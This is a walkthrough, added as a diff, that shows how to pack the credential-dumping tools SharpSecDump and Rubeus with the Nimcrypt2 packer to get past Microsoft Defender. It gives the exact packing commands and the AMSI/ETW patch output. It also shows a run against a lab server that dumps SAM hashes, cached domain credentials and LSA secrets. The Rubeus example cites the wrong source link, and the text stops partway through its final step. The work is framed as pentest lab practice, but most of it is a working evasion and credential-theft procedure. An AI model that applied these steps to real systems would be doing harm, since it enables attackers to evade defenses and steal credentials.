@@ -1,0 +1,170 @@
+================================================================================================================================================
+Antivirus/EDR bypass using the packer 'NimCrypt2'
+================================================================================================================================================
+
+'NimCrypt2' is an awesome .NET, PE, & Raw Shellcode Packer/Loader Written in Nim and designed to bypass AV and EDR.
+
+=> Source: https://github.com/icyguider/Nimcrypt2
+
+Features:
+--------
+ - SandBox check
+ - AMSI bypass
+ - ETW bypass
+ - Use of direct syscalls and the ability to load regular PE files as well as raw shellcode
+ - ...
+ 
+
+
+================================================================================================================================================
+Example 1 - The tool SharpSecDump is not detected nor blocked by Defender AV after being packed by Nimcrypt2
+================================================================================================================================================
+
+STEP 1 - Download the code of the tool SharSecDump from Github and compile it
+------------------------------------------------------------------------------
+> Source: https://github.com/G0ldenGunSec/SharpSecDump       
+> The tool is .Net port of the remote SAM + LSA Secrets dumping functionality of impacket's secretsdump.py
+> It is detected by the Microsoft Defender Antivirus.
+
+
+STEP 2 - Pack the tool 'SharSecDump.exe' using NimCrypt2
+---------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main$ ./nimcrypt -f ./SharpSecDump.exe -t csharp -o NimSharpSecDump.exe
+                      ___                                           
+                   .-'   `'.                                        
+                  /         \                                       
+                  |         ;                                       
+                  |         |           ___.--,                     
+         _.._     |0) ~ (0) |    _.---'`__.-( (_.                   
+  __.--'`_.. '.__.\    '--. \_.-' ,.--'`     `""`                   
+ ( ,.--'`   ',__ /./;   ;, '.__.'`    __                            
+ _`) )  .---.__.' / |   |\   \__..--""  ""'--.,_                    
+`---' .'.''-._.-'`_./  /\ '.  \ _.-~~~````~~~-._`-.__.'             
+      | |  .' _.-' |  |  \  \  '.               `~---`              
+       \ \/ .'     \  \   '. '-._)                                  
+        \/ /        \  \    `=.__`~-.   Nimcrypt v2               
+   jgs  / /\         `) )    / / `"".`\                             
+  , _.-'.'\ \        / /    ( (     / /  3-in-1 C#, PE, & Raw Shellcode Loader
+   `--~`   ) )    .-'.'      '.'.  | (                              
+          (/`    ( (`          ) )  '-;                             
+           `      '-;         (-'                                   
+
+[+] NimlineWhispers2 enabled
+[+] String encryption disabled
+[+] Sandbox checks enabled
+[+] Unhooking ntdll.dll disabled
+[+] Verbose messages disabled
+[+] Syscall name randomization enabled
+Hint: used config file '/home/jeff/.choosenim/toolchains/nim-1.6.8/config/nim.cfg' [Conf]
+Hint: used config file '/home/jeff/.choosenim/toolchains/nim-1.6.8/config/config.nims' [Conf]
+..........................................................................................................................................................................................
+/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/syscalls2.nim(5, 5) Hint: 'Value' should be: 'value' [Name]
+/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/syscalls2.nim(6, 5) Hint: 'ValuePtr' should be: 'valuePtr' [Name]
+/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/syscalls2.nim(8, 5) Hint: 'Attribute' should be: 'attribute' [Name]
+<SNIP>
+Hint: /usr/bin/x86_64-w64-mingw32-gcc -c -w -fmax-errors=3 -mno-ms-bitfields -DWIN32_LEAN_AND_MEAN -masm=intel -Os -fno-ident   -I/home/jeff/.choosenim/toolchains/nim-1.6.8/lib -I/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main -o /home/jeff/.cache/nim/stub_r/@mstub.nim.c.o /home/jeff/.cache/nim/stub_r/@mstub.nim.c [Exec]
+Hint:  [Link]
+Hint: gc: refc; opt: size; options: -d:release
+1270751 lines; 9.856s; 349.324MiB peakmem; proj: /home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/stub.nim; out: /home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/NimSharpSecDump.exe [SuccessX]
+
+[+] Stub compiled successfully as NimSharpSecDump.exe
+
+
+STEP 3 - Run the packed version of tool 'NimSharSecDump.exe' whithout being detected nor blocked by Defender AV
+----------------------------------------------------------------------------------------------------------------
+
+The tool is run on a Windows 10 laptop (with Defender AV enabled and up-to-date) and the target is a fully patched Windows 2016 of my pentest lab
+(with Defender AV enabled and up-to-date).
+
+C:\Users\Administrator.PO718687\Documents\Tools-AD>NimSharpSecDump.exe -target=192.168.1.196  -u=administrator -p=superpasswordlabtest -d=.
+[*] Running sandbox checks...
+[*] Applying amsi patch: true
+[*] Applying etw patch: true
+[*] Decrypting packed exe...
+[*] RemoteRegistry service started on 192.168.1.196
+[*] Parsing SAM hive on 192.168.1.196
+[*] Parsing SECURITY hive on 192.168.1.196
+[*] Sucessfully cleaned up on 192.168.1.196
+---------------Results from 192.168.1.196---------------
+[*] SAM hashes
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:413eb6b2b7676<SNIP>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c5<SNIP>
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16a<SNIP>
+backup:1002:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a<SNIP>
+auditor:1003:aad3b435b51404eeaad3b435b51404ee:08d30f5e8206ed215a<SNIP>
+[*] Cached domain logon information(domain/username:hash)
+COMPANY.WORK/svc_web_jenkins:$DCC2$10240#svc_web_jenkins#b839123<SNIP>
+COMPANY.WORK/jeff.audit:$DCC2$10240#jeff.audit#35d2d7410df5dedbc<SNIP>
+COMPANY.WORK/iurie.audit:$DCC2$10240#iurie.audit#b7433010e1d893d<SNIP>
+COMPANY.WORK/alain.delon:$DCC2$10240#alain.delon#8087b82bfb8d9c7<SNIP>
+[*] LSA Secrets
+[*] $MACHINE.ACC
+company.work\Webserver1$:aad3b435b51404eeaad3b435b51404ee:768b7d0147358572cb229d7<SNIP>
+[*] DPAPI_SYSTEM
+dpapi_machinekey:96a5b59df0f751eae938a4581684cc8<SNIP>
+dpapi_userkey:a1f7f2b8a04f0fc20b67607f5951e7f48f<SNIP>
+[*] NL$KM
+NL$KM:6f11bbb5951aab1a3bf8bb712f79084c0b35eaea18c73ecad75aa4759920e644ce53902da5c<SNIP>
+---------------Script execution completed---------------
+
+
+================================================================================================================================================
+Example 2 - The tool Rubeus is detected but not blocked by Defender AV after being packed by Nimcrypt2
+================================================================================================================================================
+
+STEP 1 - Download the code of the tool Rubeus from Github and compile it
+------------------------------------------------------------------------------
+> Source: https://github.com/G0ldenGunSec/SharpSecDump    
+
+> Note: I used an old version Rubeus that I modified a bit and that was not detected for a while by antivirus but unfortunately it is now detected 
+by several antivirus such as Defender AV and Symantec.
+
+
+STEP 2 - Pack the tool 'Rubeus.exe' using NimCrypt2
+---------------------------------------------------------
+jeff@kali:~/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main$ ./nimcrypt -f ./Rubeus.exe -t csharp -o NimRubeus.exe
+                      ___                                           
+                   .-'   `'.                                        
+                  /         \                                       
+                  |         ;                                       
+                  |         |           ___.--,                     
+         _.._     |0) ~ (0) |    _.---'`__.-( (_.                   
+  __.--'`_.. '.__.\    '--. \_.-' ,.--'`     `""`                   
+ ( ,.--'`   ',__ /./;   ;, '.__.'`    __                            
+ _`) )  .---.__.' / |   |\   \__..--""  ""'--.,_                    
+`---' .'.''-._.-'`_./  /\ '.  \ _.-~~~````~~~-._`-.__.'             
+      | |  .' _.-' |  |  \  \  '.               `~---`              
+       \ \/ .'     \  \   '. '-._)                                  
+        \/ /        \  \    `=.__`~-.   Nimcrypt v2               
+   jgs  / /\         `) )    / / `"".`\                             
+  , _.-'.'\ \        / /    ( (     / /  3-in-1 C#, PE, & Raw Shellcode Loader
+   `--~`   ) )    .-'.'      '.'.  | (                              
+          (/`    ( (`          ) )  '-;                             
+           `      '-;         (-'                                   
+
+[+] NimlineWhispers2 enabled
+[+] String encryption disabled
+[+] Sandbox checks enabled
+[+] Unhooking ntdll.dll disabled
+[+] Verbose messages disabled
+[+] Syscall name randomization enabled
+Hint: used config file '/home/jeff/.choosenim/toolchains/nim-1.6.8/config/nim.cfg' [Conf]
+Hint: used config file '/home/jeff/.choosenim/toolchains/nim-1.6.8/config/config.nims' [Conf]
+..........................................................................................................................................................................................
+/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/syscalls2.nim(5, 5) Hint: 'Value' should be: 'value' [Name]
+/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/syscalls2.nim(6, 5) Hint: 'ValuePtr' should be: 'valuePtr' [Name]
+<SNIP>
+Hint: /usr/bin/x86_64-w64-mingw32-gcc -c -w -fmax-errors=3 -mno-ms-bitfields -DWIN32_LEAN_AND_MEAN -masm=intel -Os -fno-ident   -I/home/jeff/.choosenim/toolchains/nim-1.6.8/lib -I/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main -o /home/jeff/.cache/nim/stub_r/@m..@s..@s..@s..@s.choosenim@stoolchains@snim-1.6.8@slib@spure@srandom.nim.c.o /home/jeff/.cache/nim/stub_r/@m..@s..@s..@s..@s.choosenim@stoolchains@snim-1.6.8@slib@spure@srandom.nim.c [Exec]
+Hint: /usr/bin/x86_64-w64-mingw32-gcc -c -w -fmax-errors=3 -mno-ms-bitfields -DWIN32_LEAN_AND_MEAN -masm=intel -Os -fno-ident   -I/home/jeff/.choosenim/toolchains/nim-1.6.8/lib -I/home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main -o /home/jeff/.cache/nim/stub_r/@mstub.nim.c.o /home/jeff/.cache/nim/stub_r/@mstub.nim.c [Exec]
+Hint:  [Link]
+Hint: gc: refc; opt: size; options: -d:release
+1270751 lines; 15.251s; 349.383MiB peakmem; proj: /home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/stub.nim; out: /home/jeff/Documents/Tools/Nimcrypt2-main/Nimcrypt2-main/NimRubeus.exe [SuccessX]
+
+
+STEP 3 - Run the packed version of tool 'NimRubeus.exe' whithout being detected nor blocked by Defender AV
+-----------------------------------------------------------------------------------------------------------
+
+The tool is run on a Windows 2016 server (with Defender AV enabled and up-to-date) and the target is a fully patched Windows 2016 Domain Controller of my pentest lab
+(with Defender AV enabled and up-to-date).
+
